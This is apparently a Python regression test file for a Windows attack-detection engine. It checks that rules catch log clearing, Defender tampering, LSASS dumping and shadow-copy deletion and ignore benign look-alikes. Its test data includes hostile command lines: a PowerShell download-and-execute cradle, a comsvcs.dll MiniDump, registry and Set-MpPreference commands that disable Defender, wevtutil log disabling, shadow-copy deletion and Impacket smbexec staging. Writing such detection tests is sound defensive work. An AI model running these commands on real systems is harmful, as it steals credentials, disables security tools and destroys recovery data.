"""Regression tests reproducing each reviewed defect (Blocking B1-B7, Important I1-I6) and the hard negatives.

Each test fails on the behaviour the reviewer reproduced before the fix.
"""

from __future__ import annotations

import base64

from romulus.detect.windows_cmdline import (
    parse_cmd_payload,
    ps_tokens,
    rundll32_target,
)
from romulus.detect.windows_credentials import ProcdumpLsass
from romulus.detect.windows_defense import (
    DefenderImpairment,
    HostFirewallDisable,
    InhibitRecovery,
    LogClearingByCommand,
    SecurityServiceTampering,
)
from romulus.detect.windows_lineage import LureAppSpawnsCodeRunner
from romulus.detect.windows_proxy import CurlDownload, PowerShellEncodedOrCradle, Rundll32Execution
from romulus.detect.windows_remote import RemoteExecutionParent, ServiceChildToAdminShare
from tests.windows_process_support import run, security4688, security4689, sysmon1, system_boot

PS = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
WINWORD = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
CMD = r"C:\Windows\System32\cmd.exe"
CHROME = r"C:\Program Files\Google\Chrome\Application\chrome.exe"


def _enc(script: str) -> str:
    return base64.b64encode(script.encode("utf-16-le")).decode()


# ---- B1: fleet merging hides new-host matches and the attacker's content ----

def test_b1_different_payloads_are_never_one_group():
    rule = PowerShellEncodedOrCradle()
    benign = [sysmon1(image=PS, command=f"powershell -nop -enc {_enc('Get-Service ccmexec')}",
                      host=f"ws{n}.t", guid=100 + n, offset=n) for n in range(3)]
    attacker = sysmon1(image=PS, command=f"powershell -enc {_enc('Invoke-Mimikatz')}", host="dc01.t",
                       guid=999, offset=10)
    out = run(rule, benign + [attacker])
    claims = " ".join(m.claim for m in out)
    assert "invoke-mimikatz" in claims.lower()            # the attacker's decoded content is never hidden
    assert "dc01" in claims                                # on its own host, its own finding
    # four distinct (shape, host) firsts: three benign hosts + the attacker, each immediate
    assert sum(m.claim_type == "observed_action" for m in out) == 4


# ---- B2: the 4688 parent resolver must see fences ----

def test_b2_termination_between_parent_and_child_is_undecided_not_matched():
    parent = security4688(image=WINWORD, command="winword.exe", pid=0x700, ppid=0x10, offset=0)
    term = security4689(image=WINWORD, pid=0x700, offset=1)
    child = security4688(image=PS, command="powershell.exe", pid=0x2bc, ppid=0x700, offset=5)
    rule = LureAppSpawnsCodeRunner()
    assert run(rule, [parent, term, child]) == []
    assert rule.undecided.get("parent_ended") == 1


def test_b2_boot_between_parent_and_child_is_undecided():
    parent = security4688(image=WINWORD, command="winword.exe", pid=0x700, ppid=0x10, offset=0)
    boot = system_boot(offset=3)
    child = security4688(image=PS, command="powershell.exe", pid=0x2bc, ppid=0x700, offset=5)
    rule = LureAppSpawnsCodeRunner()
    assert run(rule, [parent, boot, child]) == []
    assert rule.undecided.get("parent_boot") == 1


def test_b2_pid_reuse_after_termination_resolves_to_the_reusing_image():
    # pid 0x700 is WINWORD, terminates, then a benign svchost reuses 0x700; the child's parent is the reuser
    first = security4688(image=WINWORD, command="winword.exe", pid=0x700, ppid=0x10, offset=0)
    term = security4689(image=WINWORD, pid=0x700, offset=1)
    reuse = security4688(image=r"C:\Windows\System32\svchost.exe", command="svchost.exe -k netsvcs",
                         pid=0x700, ppid=0x10, offset=2)
    child = security4688(image=PS, command="powershell.exe", pid=0x2bc, ppid=0x700, offset=5)
    rule = LureAppSpawnsCodeRunner()
    # the reusing parent is svchost (not a lure), so no match and no false WINWORD attribution
    assert run(rule, [first, term, reuse, child]) == []


def test_b2_fences_out_of_order_and_across_batches_give_the_same_answer():
    parent = security4688(image=WINWORD, command="winword.exe", pid=0x700, ppid=0x10, offset=0)
    term = security4689(image=WINWORD, pid=0x700, offset=1)
    child = security4688(image=PS, command="powershell.exe", pid=0x2bc, ppid=0x700, offset=5)
    rule = LureAppSpawnsCodeRunner()
    # the fence and parent arrive out of order in one partition, the child in a later partition: the termination is
    # still placed before the child (parent ended), never matched
    assert run(rule, [[term, parent], [child]]) == []
    assert rule.undecided.get("parent_ended") == 1


# ---- B3: wevtutil sl /e:true is not a disable ----

def test_b3_wevtutil_enable_does_not_fire_disable_fires():
    enable = sysmon1(image=r"C:\Windows\System32\wevtutil.exe", command="wevtutil sl Security /e:true")
    disable = sysmon1(image=r"C:\Windows\System32\wevtutil.exe", command="wevtutil sl Security /e:false", guid=9)
    malformed = sysmon1(image=r"C:\Windows\System32\wevtutil.exe", command="wevtutil sl Security /e:maybe", guid=10)
    assert run(LogClearingByCommand(), [enable]) == []
    assert run(LogClearingByCommand(), [disable])[0].proposed_lane == "high"
    assert run(LogClearingByCommand(), [malformed]) == []


# ---- B4: Defender registry branch must parse verb and value ----

def test_b4_reg_query_and_reenable_do_not_fire_disable_and_exclusion_do():
    query = sysmon1(image=r"C:\Windows\System32\reg.exe",
                    command=r'reg query "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths'"'"'')
    reenable = sysmon1(image=r"C:\Windows\System32\reg.exe",
                       command=r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware '
                               r"/t REG_DWORD /d 0 /f", guid=9)
    disable = sysmon1(image=r"C:\Windows\System32\reg.exe",
                      command=r'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware '
                              r"/t REG_DWORD /d 1 /f", guid=10)
    exclusion = sysmon1(image=r"C:\Windows\System32\reg.exe",
                        command=r'reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" '
                                r'/v C:\temp /t REG_DWORD /d 0 /f', guid=11)
    assert run(DefenderImpairment(), [query]) == []
    assert run(DefenderImpairment(), [reenable]) == []                 # /d 0 re-enables: never "disabled"
    assert run(DefenderImpairment(), [disable])[0].proposed_lane == "high"
    assert run(DefenderImpairment(), [exclusion])[0].proposed_lane == "high"


# ---- B5: Set-MpPreference -Disable... $false is not a disable; aliases work (I4) ----

def test_b5_mppreference_boolean_and_aliases():
    reenable = sysmon1(image=PS, command="powershell -Command Set-MpPreference -DisableRealtimeMonitoring $false")
    disable = sysmon1(image=PS, command="powershell -Command Set-MpPreference -DisableRealtimeMonitoring $true",
                      guid=9)
    alias = sysmon1(image=PS, command="powershell -Command Set-MpPreference -drtm $true", guid=10)
    bare = sysmon1(image=PS, command="powershell -Command Set-MpPreference -dbm", guid=11)
    assert run(DefenderImpairment(), [reenable]) == []
    assert run(DefenderImpairment(), [disable])[0].proposed_lane == "high"
    assert run(DefenderImpairment(), [alias])[0].proposed_lane == "high"
    assert run(DefenderImpairment(), [bare])[0].proposed_lane == "high"


# ---- B6: ServiceChildToAdminShare claim with an unknown parent ----

def test_b6_unknown_parent_claim_is_not_garbled():
    event = security4688(image=CMD, command=r"cmd.exe /c dir > \\fs01\C$\logs\x.txt", pid=0x500, ppid=0x123, offset=1)
    [match] = run(ServiceChildToAdminShare(), [event])
    assert "could not be resolved" in match.claim
    assert "a cmd command a service-hosted cmd" not in match.claim       # the old garbled text


# ---- B7: lure rule splits browsers; native-messaging excluded ----

def test_b7_office_is_high_browser_is_lead_native_messaging_excluded():
    office = sysmon1(image=PS, parent_image=WINWORD, command="powershell.exe -nop")
    assert run(LureAppSpawnsCodeRunner(), [office])[0].proposed_lane == "high"

    browser_shell = sysmon1(image=PS, parent_image=CHROME, command="powershell.exe -nop", guid=9)
    [m] = run(LureAppSpawnsCodeRunner(), [browser_shell])
    assert m.proposed_lane == "lead"

    nm = sysmon1(image=CMD, parent_image=CHROME, guid=10,
                 command=r'cmd.exe /d /s /c ""C:\Vendor\host.exe" chrome-extension://abcdef/ --parent-window=0"')
    assert run(LureAppSpawnsCodeRunner(), [nm]) == []


# ---- I1: comsvcs ordinal / no .dll / path-qualified / space-joined ----

def test_i1_comsvcs_minidump_ordinal_forms():
    for command in (
        r"rundll32.exe C:\Windows\System32\comsvcs.dll, #24 624 C:\x.dmp full",
        "rundll32.exe comsvcs,MiniDump 624 C:\\x.dmp full",
        "rundll32 comsvcs.dll #+24 624 x full",
        'rundll32 "C:\\Windows\\System32\\COMSVCS.DLL",#-4294967272 624 x full',
    ):
        out = run(Rundll32Execution(), [sysmon1(image=r"C:\Windows\System32\rundll32.exe", command=command)])
        assert len(out) == 1, command
        assert "memory" in out[0].claim
    # a benign rundll32 of a real DLL export does not fire
    assert run(Rundll32Execution(), [sysmon1(image=r"C:\Windows\System32\rundll32.exe",
                                             command=r"rundll32.exe shell32.dll,Control_RunDLL desk.cpl")]) == []


def test_i1_rundll32_target_parser():
    assert rundll32_target(["rundll32.exe", "comsvcs.dll,", "#24", "624"]) == ("comsvcs", "#24")
    assert rundll32_target(["rundll32.exe", "comsvcs,MiniDump", "624"]) == ("comsvcs", "minidump")


# ---- I2: # starts a comment only at a token boundary; block comments ----

def test_i2_hash_mid_word_is_not_a_comment():
    tokens = ps_tokens("echo a#b;IEX(New-Object Net.WebClient).DownloadString('http://x')")
    members = {t.text for t in tokens if t.kind == "member"}
    assert "downloadstring" in members                 # not hidden by a#b
    # a true leading-# comment is still dropped
    assert all(t.text != "iex" for t in ps_tokens("# IEX(evil)\nGet-Date"))


def test_i2_cradle_survives_hash_mid_word():
    event = sysmon1(image=PS,
                    command="powershell -c \"echo a#b;IEX(New-Object Net.WebClient).DownloadString('http://x/y')\"")
    assert run(PowerShellEncodedOrCradle(), [event])[0].proposed_lane == "high"


# ---- I3: Impacket smbexec .bat staging shape ----

def test_i3_smbexec_bat_staging_is_recognised():
    smb = (r'C:\Windows\system32\cmd.exe /Q /c echo cd ^> \\127.0.0.1\C$\__output 2^>^&1 > '
           r'C:\Windows\TEMP\execute.bat & C:\Windows\system32\cmd.exe /Q /c C:\Windows\TEMP\execute.bat & '
           r'del C:\Windows\TEMP\execute.bat')
    event = sysmon1(image=CMD, parent_image=r"C:\Windows\System32\services.exe", command=smb)
    [match] = run(ServiceChildToAdminShare(), [event])
    assert match.proposed_lane == "high" and "ADMIN$" not in match.claim and "C$" in match.claim


# ---- I5: shadow-copy variants ----

def test_i5_wmic_path_delete_and_tiny_resize():
    wmic = sysmon1(image=r"C:\Windows\System32\wbem\WMIC.exe",
                   command=r"wmic.exe /namespace:\\root\cimv2 path win32_shadowcopy delete")
    resize_small = sysmon1(image=r"C:\Windows\System32\vssadmin.exe",
                           command="vssadmin resize shadowstorage /for=C: /on=C: /maxsize=1MB", guid=9)
    resize_big = sysmon1(image=r"C:\Windows\System32\vssadmin.exe",
                         command="vssadmin resize shadowstorage /for=C: /on=C: /maxsize=10GB", guid=10)
    assert run(InhibitRecovery(), [wmic])[0].proposed_lane == "high"
    assert run(InhibitRecovery(), [resize_small])[0].proposed_lane == "high"   # a tiny max deletes shadows
    assert run(InhibitRecovery(), [resize_big]) == []                          # a real resize is benign


# ---- I6: 4688 lineage cites the parent record and carries the parent image predicate ----

def test_i6_4688_lineage_cites_parent_record_and_predicate():
    parent = security4688(image=WINWORD, command="winword.exe", pid=0x700, ppid=0x10, offset=0)
    child = security4688(image=PS, command="powershell.exe", pid=0x2bc, ppid=0x700, offset=5)
    [match] = run(LureAppSpawnsCodeRunner(), [parent, child])
    assert parent.id in {e.id for e in match.events}                # the parent record is cited
    assert parent.id in match.context_ids                           # as context, not the finding's subject
    parent_predicate = [p for p in match.predicate if p.field == "process.parent.executable_key"]
    assert parent_predicate and "winword.exe" in str(parent_predicate[0].value)
    assert "lineage" in parent_predicate[0].origin                  # origin points at the parent's own record


# ---- hard negatives (I8) ----

def test_hard_negatives_do_not_fire():
    # software-deployment agent spawning cmd (a browser/office is not the parent)
    deploy = sysmon1(image=CMD, parent_image=r"C:\Windows\CCM\CcmExec.exe", command="cmd.exe /c inventory.bat")
    assert run(LureAppSpawnsCodeRunner(), [deploy]) == []
    assert run(RemoteExecutionParent(), [deploy]) == []
    # Office updater (child is not a code runner)
    updater = sysmon1(image=r"C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeC2RClient.exe",
                      parent_image=WINWORD, command="officec2rclient.exe /update", guid=9)
    assert run(LureAppSpawnsCodeRunner(), [updater]) == []
    # backup software creating (not deleting) a shadow copy — the deletion rule must stay silent
    backup = sysmon1(image=r"C:\Windows\System32\vssadmin.exe", command="vssadmin create shadow /for=C:", guid=10)
    assert run(InhibitRecovery(), [backup]) == []
    # a vendor updater stopping its OWN (non-security) service
    svc = sysmon1(image=r"C:\Windows\System32\net.exe", command="net stop MyAppUpdater", guid=11)
    assert run(SecurityServiceTampering(), [svc]) == []
    # an admin re-enabling the firewall
    fw = sysmon1(image=PS, command="powershell -Command Set-NetFirewallProfile -Profile Domain -Enabled True",
                 guid=12)
    assert run(HostFirewallDisable(), [fw]) == []
    # procdump against a non-LSASS process
    pd = sysmon1(image=r"C:\tools\procdump.exe", command="procdump.exe -ma 4321 C:\\app.dmp", guid=13)
    assert run(ProcdumpLsass(), [pd]) == []
    # curl to an internal API without an output flag
    curl = sysmon1(image=r"C:\Windows\System32\curl.exe", command="curl.exe https://api.internal/health", guid=14)
    assert run(CurlDownload(), [curl]) == []


def test_cmd_payload_echo_caret_redirect_stays_literal():
    # the smbexec echo's caret-escaped redirect must not be parsed as a real redirect of echo
    [first, *_rest] = parse_cmd_payload(r"echo cd ^> \\127.0.0.1\C$\out 2^>^&1 > C:\x.bat & C:\x.bat")
    assert first.argv[0] == "echo"
    assert any(target.lower().endswith(".bat") for _op, target in first.redirects)   # only the real > is a redirect
    assert all("c$" not in target.lower() for _op, target in first.redirects)        # the ^> is literal, not a redirect
